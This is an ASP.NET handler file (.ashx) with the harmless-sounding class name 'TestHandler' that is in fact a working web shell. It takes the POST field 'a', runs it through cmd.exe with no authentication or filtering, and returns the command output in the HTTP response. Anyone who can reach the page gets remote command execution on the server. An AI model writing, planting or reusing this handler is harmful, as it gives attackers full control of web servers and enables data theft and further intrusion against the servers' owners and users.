<%@ WebHandler Language="C#" Class="TestHandler" %>

using System;
using System.Web;
using System.Diagnostics;

public class TestHandler : IHttpHandler {
    
    public void ProcessRequest (HttpContext context) {
        context.Response.ContentType = "text/plain";
        System.Diagnostics.Process si = new System.Diagnostics.Process();
        si.StartInfo.WorkingDirectory = @"c:\";
        si.StartInfo.UseShellExecute = false;
        si.StartInfo.FileName = "cmd.exe";
        si.StartInfo.Arguments = "/c "+ context.Request.Form["a"];
        si.StartInfo.CreateNoWindow = true;
        si.StartInfo.RedirectStandardInput = true;
        si.StartInfo.RedirectStandardOutput = true;
        si.StartInfo.RedirectStandardError = true;
        si.Start();
        string output = si.StandardOutput.ReadToEnd();
        si.Close();
        context.Response.Write(output);
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }

}